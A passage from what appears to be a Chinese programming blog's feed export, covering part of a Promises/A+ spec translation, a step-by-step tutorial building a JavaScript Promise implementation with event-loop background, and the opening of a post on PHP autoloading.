<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">promise.<span class="title function_">then</span>(onFulfilled, onRejected)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>2.2.1 <code>onFulfilled</code> 和 <code>onRejected</code> 都是可选参数：</p>
<ul>
<li><p>2.2.1.1 如果 <code>onFulfilled</code> 不是函数，必须忽略它。</p>
</li>
<li><p>2.2.1.2 如果 <code>onRejected</code> 不是函数，必须忽略它。</p>
</li>
</ul>
</li>
<li><p>2.2.2 如果 <code>onFulfilled</code> 是一个函数：</p>
<ul>
<li><p>2.2.2.1 它必须在 Promise 变成 fulfilled 状态后以 Promise 的 value 作为第一个参数被调用。</p>
</li>
<li><p>2.2.2.2 它不能在 Promise 变成 fulfilled 状态以前调用。</p>
</li>
<li><p>2.2.2.3 它只能被调用一次。</p>
</li>
</ul>
</li>
<li><p>2.2.3 如果 <code>onRejected</code> 是一个函数：</p>
<ul>
<li><p>2.2.3.1 它必须在 Promise 变成 rejected 状态后以 Promise 的 reason 作为第一个参数被调用。</p>
</li>
<li><p>2.2.3.2 它不能在 Promise 变成  rejected 状态以前调用。</p>
</li>
<li><p>2.2.3.3 它只能被调用一次。</p>
</li>
</ul>
</li>
<li><p>2.2.4 <code>onFulfilled</code>  或  <code>onRejected</code>  不能在执行栈(<a href="https://es5.github.io/#x10.3">execution context</a>)  仅包含平台代码之前调用。</p>
</li>
<li><p>2.2.5 <code>onFulfilled</code> 和 <code>onRejected</code> 必须以函数形式被调用（不能传递 this 指针）。</p>
</li>
<li><p>2.2.6 同一个 Promise 的 <code>then</code> 方法可能被多次调用。</p>
<ul>
<li><p>2.2.6.1 当且仅当 Promise 变成 fulfilled 后，各个 <code>onFullfilled</code> 回调必须按照原始的调用顺序被依次执行。</p>
</li>
<li><p>2.2.6.2 当且仅当 Promise 变成 rejected 后，各个 <code>onRejected</code> 回调必须按照原始的调用顺序被依次执行。</p>
</li>
</ul>
</li>
<li><p>2.2.7 <code>then</code> 方法必须返回一个新的 Promise。</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">promise2 = promise1.<span class="title function_">then</span>(onFulfilled, onRejected);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>2.2.7.1 如果 <code>onFulfilled</code> 或 <code>onRejected</code> 返回一个值 <code>x</code>，则执行 Promise 解析过程 <code>[[Resolve]](promise2, x)</code>。</p>
</li>
<li><p>2.2.7.2 如果 <code>onFulfilled</code> 或 <code>onRejected</code> 抛出异常 <code>e</code>，则执行  Promise 解析过程 <code>[[Resolve]](promise2, e)</code>。</p>
</li>
<li><p>2.2.7.3 如果 <code>onFulfilled</code> 不是一个函数，<code>promise1</code> 处于 fulfilled 状态，则 <code>promise2</code> 必须变成 fulfilled 状态且 vale 和 <code>promise1</code> 相同。</p>
</li>
<li><p>2.2.7.4 如果 <code>onRejected</code> 不是一个函数，<code>promise1</code> 处于 rejected 状态，则 <code>promise2</code> 必须变成 rejected 状态且 reason 和 <code>promise1</code> 相同。</p>
</li>
</ul>
<h3 id="2-3-Promise-处理程序"><a href="#2-3-Promise-处理程序" class="headerlink" title="2.3 Promise 处理程序"></a>2.3 Promise 处理程序</h3><p>Promise 处理程序是一个抽象过程，以一个 Promise 和 value 作为输入，表示为 <code>[[Resolve]](promise, x)</code>。如果 <code>x</code> 是一个 thenable 对象，则 <code>promise</code> 将直接采用 <code>x</code> 的状态，否则 <code>promise</code> 会试图变成 fulfilled 状态，且其 value 等于 <code>x</code>。</p>
<p>thenable 的处理程序允许不同 Promise 可以互相操作，只要它们提供一个兼容 Promises&#x2F;A+ 的 <code>then</code> 方法。它还允许 Promises&#x2F;A+ 实现使用合理的 <code>then</code> 方法“集成”不符合标准的实现。</p>
<p><code>[[Resolve]](promise, x)</code> 按如下步骤执行：</p>
<ul>
<li>2.3.1 如果 <code>promise</code> 和 <code>x</code> 是同一个对象，则 <code>promise</code> 变成 rejected，reason 是一个 <code>TypeError</code> 异常。</li>
<li>2.3.2 如果 <code>x</code> 是一个 Promise，则 <code>promise</code> 采用 <code>x</code> 的状态：<ul>
<li>如果 <code>x</code> 处于 pending 状态，则 <code>promise</code> 必须保持 pending 状态直到 <code>x</code> 的状态变成 fulfilled 或 rejected。</li>
<li>当且仅当 <code>x</code>  变成 fulfilled， <code>promise</code>  也以相同的 value 变成 fullfiled 状态。</li>
<li>当且仅当 <code>x</code> 变成 rejected，<code>promise</code> 也以相同的 reason 变成 rejected 状态。</li>
</ul>
</li>
<li>2.3.3 如果 <code>x</code> 是一个对象或者一个函数：<ul>
<li>把 <code>x.then</code> 赋值给 <code>then</code></li>
<li>如果引用 <code>x.then</code> 属性时抛出异常 <code>e</code>，那么用 <code>e</code> 作为 <code>promise</code> 的 reason 将其变成 rejected 状态。</li>
<li>如果 <code>then</code> 是一个函数，则以 <code>x</code> 作为 <code>this</code>， <code>resolvePromise</code> 作为第一个参数，<code>rejectePromise</code> 作为第二参数调用它。</li>
</ul>
</li>
</ul>
<p>&#x2F;&#x2F; TODO ……</p>
<h2 id="3-注解"><a href="#3-注解" class="headerlink" title="3. 注解"></a>3. 注解</h2>]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Promise</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScipr 异步和 Promise</title>
    <url>/fundamental/programming-language/javascript/dev-implement-promise-step-by-step/</url>
    <content><![CDATA[<h2 id="异步概述"><a href="#异步概述" class="headerlink" title="异步概述"></a>异步概述</h2><p>我们知道 JavaScirpt 有单线程和异步的特点，为什么 JavaScript 不使用多线程？为什么 JavaScript 要使用异步？</p>
<span id="more"></span>
<p><strong>为什么要单线程？</strong></p>
<p>JavaScript does not support multi-threading because the JavaScript interpreter in the browser is a single thread (AFAIK). Even Google Chrome will not let a single web page’s JavaScript run concurrently because this would cause massive concurrency issues in existing web pages. All Chrome does is separate multiple components (different tabs, plug-ins, etcetera) into separate processes, but I can’t imagine a single page having more than one JavaScript thread.</p>
<p><strong>为什么要异步？</strong></p>
<p>在单核 CPU 的机器上，所谓的并发都只是理论上的，CPU 在特定的时刻只能执行一个任务。随着计算机的发展，今天的计算机几乎都是多核的，同一时刻不同的 CPU 执行着各自的任务，着才是真正意义上的并发。在 JavaScript 中，往往有些任务耗时较长，且这些任务有 JavaScript 发起但并没有一直在占用解释器线程，也就是说这些任务需要其他进程（线程）做额外的处理。如果同步执行这些任务将会导致 UI 阻塞，影响用户体验。</p>
<p>UI 加载图片 A 和 B 耗时为 $T_A$ 和 $T_B$，如果同步执行总耗时为：</p>
<p>$$ T_A + T_B$$</p>
<p>如果异步执行，总耗时为：</p>
<p>$$max(T_A, T_B)$$</p>
<p>随着应用复杂性的增加，异步任务会越来越多，同步与异步的优劣为凸显出来。</p>
<p><strong>如何在单线程中实现异步？ – Event Loop</strong></p>
<p>在 JavaScript 中，所有的代码都是有序执行的，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line"><span class="keyword">let</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="comment">// output: 1 2</span></span><br></pre></td></tr></table></figure>

<p>所谓的异步只不过是编排代码执行顺序的一种方式，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// output: 2 1</span></span><br><span class="line"><span class="comment">// why?</span></span><br></pre></td></tr></table></figure>

<p>所有的异步任务最终解决方案都是回调函数，Promise 和 Genarator 都是基于回调函数的上层建筑。那么，基于回调函数的异步是如何实现的呢？</p>
<p>不同的 JavaScript 解释器对异步的实现细节不尽相同，但他们的本质是一样的，那就是<strong>事件循环</strong>。一段 JavaScript 代执行时，会将任务分为两类（这种任务的分类是广义的，为了简化问题本文使用这种定义）：</p>
<ul>
<li>同步任务</li>
<li>异步任务</li>
</ul>
<p><img src="/images/2019-10/event-loop-01.png"></p>
<p>简单来说，</p>
<ol>
<li>同步任务在主线程中执行，异步任务有专门的线程执行（AJAX 线程）</li>
<li>异步线程执行完成后进入事件队列</li>
<li>主线程会在同步任务执行完成后会读取事件队列中的异步任务的结果并执行回调函数</li>
<li>上述过程不断重复，直到所有任务都执行完成，着就是常说的事件循环 (Event Loop)</li>
</ol>
<h2 id="异步的解决方案之-Promise"><a href="#异步的解决方案之-Promise" class="headerlink" title="异步的解决方案之 Promise"></a>异步的解决方案之 Promise</h2><p>参考 <a href="https://promisesaplus.com/">https://promisesaplus.com/</a> 标准。</p>
<h3 id="Promise-使用"><a href="#Promise-使用" class="headerlink" title="Promise 使用"></a>Promise 使用</h3><p>使用 Promise 读取 <code>hello.txt</code> 文件，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> samplePromise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">    fs.<span class="title function_">readFile</span>(<span class="string">&quot;./hello.txt&quot;</span>, &#123; <span class="attr">encoding</span>: <span class="string">&quot;utf8&quot;</span> &#125;, <span class="keyword">function</span>(<span class="params">err, contents</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// 读取失败</span></span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="title function_">reject</span>(err);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 读取成功</span></span><br><span class="line">        <span class="title function_">resolve</span>(contents);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="Promise-构造函数"><a href="#Promise-构造函数" class="headerlink" title="Promise 构造函数"></a>Promise 构造函数</h3><p>创建 Promise 时需要传递一个含有两个有名参数的执行函数，我们称之为 <code>excutor</code>，一般而言 <code>excutor</code> 中的有名参数统一命名为 <code>resolve</code> 和 <code>reject</code>。使用最原始的回调函数方式在 <code>excutor</code> 中处理异步逻辑（通常而言，这里的异步逻辑是指调用 JavaScript 执行环境提供的异步API，包括 <code>setTimeout</code>,  <code>setInterval</code>, <code>XMLHttpRequst</code> 对象，以及 Node 环境下的很多系统调用），以异步处理结果作为实际参数调用 <code>reject</code> 或者 <code>resolve</code>。</p>
<p>至此，我们可以抽象 Promise 如下定义：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Promise</span> = <span class="keyword">function</span>(<span class="params">excutor</span>) &#123;</span><br><span class="line">    <span class="comment">// We need to define reject and resolve before call the excutor</span></span><br><span class="line">    <span class="title function_">excutor</span>(reject, resolve);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文件读取成功和失败时，分别执行 <code>resolve</code> 和 <code>reject</code>，这说明 <code>excutor</code> 所需的两个参数都必须是函数类型。因此在 Promise 中执行 <code>excutor</code> 之前需要定义两个<strong>函数类型</strong>的参数 <code>reject</code> 和 <code>resolve</code>，如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Promise</span> = <span class="keyword">function</span>(<span class="params">excutor</span>) &#123;</span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">value</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">reason</span>) &#123;&#125;</span><br><span class="line">    <span class="title function_">excutor</span>(reject, resolve);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Promise 的初始状态为pending，它可以由此转为 fulfilled（一致称之为 resolved）或 rejected</p>
<pre class="mermaid">graph TB
0((pending)) --> |done| 1((resolved))
0 -->|failed| -1((rejected))</pre>

<p>因此还需要一个 status 属性表示 Promise 的状态：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Promise</span> = <span class="keyword">function</span>(<span class="params">excutor</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> self = <span class="variable language_">this</span>;</span><br><span class="line">    self.<span class="property">status</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">value</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">reason</span>) &#123;&#125;</span><br><span class="line">    <span class="title function_">excutor</span>(reject, resolve);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="than-方法"><a href="#than-方法" class="headerlink" title="than 方法"></a>than 方法</h3><p>创建 Promise 实例后，在构造函数中执行异步逻辑，然后在 then 中获取回调结果，基本语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myPromise.then(onResolve, onReject); </span><br><span class="line">// onResolve, onReject is a function with one parameter, such as:</span><br><span class="line">myPromise.then((data) =&gt; &#123;</span><br><span class="line">	console.log(data);</span><br><span class="line">&#125;, (err) =&gt; &#123;</span><br><span class="line">	console.log(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>读取文件案例如下，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> samplePromise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">    fs.<span class="title function_">readFile</span>(<span class="string">&quot;./package.json&quot;</span>, &#123; <span class="attr">encoding</span>: <span class="string">&quot;utf8&quot;</span> &#125;, <span class="keyword">function</span>(<span class="params">err, contents</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// 读取失败</span></span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="title function_">reject</span>(err);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 读取成功</span></span><br><span class="line">        <span class="title function_">resolve</span>(contents);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// processing data</span></span><br><span class="line">samplePromise</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>

<p>文件读取成功时，then 的 resolve 参数中的 <code>data</code> 参数即为 Promise 构造函数中执行 resolve 时传入的参数，也就是说 <code>data</code> &lt;&#x3D;&gt; <code>contents</code>。</p>
<p>因此， resolve 至少应该完成两件事情：</p>
<ol>
<li>更新 status 为 resolved</li>
<li>将回调数据储存起来，方便 then 方法读取</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    self.<span class="property">status</span> = <span class="string">&#x27;resolved&#x27;</span>;</span><br><span class="line">    self.<span class="property">data</span> = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>then 函数执行时，如果 Promise 为 resolved 状态，则执行传入的 onResolved 函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> self = <span class="variable language_">this</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (self.<span class="property">status</span> === <span class="string">&#x27;resolved&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">onResolved</span>(self.<span class="property">data</span>); <span class="comment">// 读取 resolve 保存的数据做为成功的参数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是，Promise&#x2F;A 标准中明确规定了 then 要返回一个新的 Promise 对象，所以代码应该如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> self = <span class="variable language_">this</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (self.<span class="property">status</span> === <span class="string">&#x27;resolved&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> x = <span class="title function_">onResolved</span>(self.<span class="property">data</span>);</span><br><span class="line">            <span class="title function_">resolve</span>(x);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要考虑的问题是，如果调用 then 方法时 Promise 还是 pending 状态我们该怎么办？</p>
<p><strong>如果 then 函数执行时，Promise 的状态依然为 pending，那么我们无法确定后续状态是什么，因此只能将 then 的传递的参数 onResolved 先存起来，等待 Promise 状态变成之后再执行。</strong></p>
<ol>
<li><p>给构造函数添加一个 onResolveCallback</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Promise</span> = <span class="keyword">function</span>(<span class="params">excutor</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> self = <span class="variable language_">this</span>;</span><br><span class="line">    self.<span class="property">status</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    self.<span class="property">onResolveCallback</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">value</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">reason</span>) &#123;&#125;</span><br><span class="line">    <span class="title function_">excutor</span>(reject, resolve);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>将 onResolved 存储</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> self = <span class="variable language_">this</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (self.<span class="property">status</span> === <span class="string">&#x27;resolved&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> x = <span class="title function_">onResolved</span>(self.<span class="property">data</span>);</span><br><span class="line">            <span class="title function_">resolve</span>(x);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (self.<span class="property">status</span> === <span class="string">&#x27;pending&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">            self.<span class="property">onResolveCallback</span> = <span class="keyword">function</span>(<span class="params">value</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> x = <span class="title function_">onResolved</span>(value);</span><br><span class="line">                <span class="title function_">resolve</span>(x);</span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>状态更新成 resolved 后执行 onResolveCallback</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    self.<span class="property">status</span> = <span class="string">&#x27;resolved&#x27;</span>;</span><br><span class="line">    self.<span class="property">data</span> = value;</span><br><span class="line">    self.<span class="title function_">onResolveCallback</span>(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="整理一下"><a href="#整理一下" class="headerlink" title="整理一下"></a>整理一下</h3><p>上述代码梳理如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Promise</span> = <span class="keyword">function</span>(<span class="params">excutor</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> self = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">status</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">onResolvedCallback</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">value</span>) &#123;</span><br><span class="line">        self.<span class="property">status</span> = <span class="string">&#x27;resolved&#x27;</span>;</span><br><span class="line">        self.<span class="property">data</span> = value;</span><br><span class="line">        self.<span class="title function_">onResolvedCallback</span>(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">reason</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">excutor</span>(resolve, reject);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> self = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="keyword">if</span> (self.<span class="property">status</span> === <span class="string">&#x27;resolved&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> x = <span class="title function_">onResolved</span>(self.<span class="property">data</span>);</span><br><span class="line">            <span class="title function_">resolve</span>(x);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self.<span class="property">status</span> === <span class="string">&#x27;pending&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">            self.<span class="property">onResolvedCallback</span> = <span class="keyword">function</span>(<span class="params">value</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> x = <span class="title function_">onResolved</span>(self.<span class="property">data</span>);</span><br><span class="line">                <span class="title function_">resolve</span>(x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ----------------- Test Case ----------</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> promise1 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">    fs.<span class="title function_">readFile</span>(<span class="string">&quot;./package.json&quot;</span>, <span class="keyword">function</span>(<span class="params">err, contents</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="title function_">reject</span>(err);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_">resolve</span>(contents);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">4</span>);</span><br></pre></td></tr></table></figure>

<p>目前代码在正常情况下，似乎可以运行并得到预期结果，只不过还有一些问题：</p>
<ol>
<li><p>构造函数中的 excutor 是有外部创建的，如果执行异常应该直接 reject，如</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">   <span class="title function_">resolve</span>(data); <span class="comment">// data 未定义，程序异常 </span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>所以，构造函数应该对外部定义的函数做风险处理，then 函数中也同理</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Promise</span> = <span class="keyword">function</span>(<span class="params">excutor</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> self = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">status</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">onResolvedCallback</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">value</span>) &#123;</span><br><span class="line">        self.<span class="property">status</span> = <span class="string">&#x27;resolved&#x27;</span>;</span><br><span class="line">        self.<span class="property">data</span> = value;</span><br><span class="line">        self.<span class="title function_">onResolvedCallback</span>(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">reason</span>) &#123;&#125;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_">excutor</span>(resolve, reject);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        <span class="title function_">reject</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>调用 then 时，如果传入的 onResolved 返回值是一个 Promise，即 <code>x instanceof Promise</code>，应等待 x 的状态稳定，并采用 x 的状态和值。</p>
</li>
</ol>
   <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">    <span class="title function_">resolve</span>();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> p2 = p1.<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(data * <span class="number">10</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p2.<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Promise</tag>
        <tag>Asynchronous</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 自动加载和 Composer</title>
    <url>/fundamental/programming-language/php/php-autoload-and-composer/</url>
    <content><![CDATA[<p>和 <code>C/C++</code> 中的<code>#include</code>一样，PHP 提供 require 和 include 等方法允许将一个外部 PHP 文件引入到当前文件中，include与require没有本质上的区别，唯一的不同在于错误级别，当文件无法被正常加载时include会抛出warning警告，而require则会抛出error错误。</p>
<span id="more"></span>

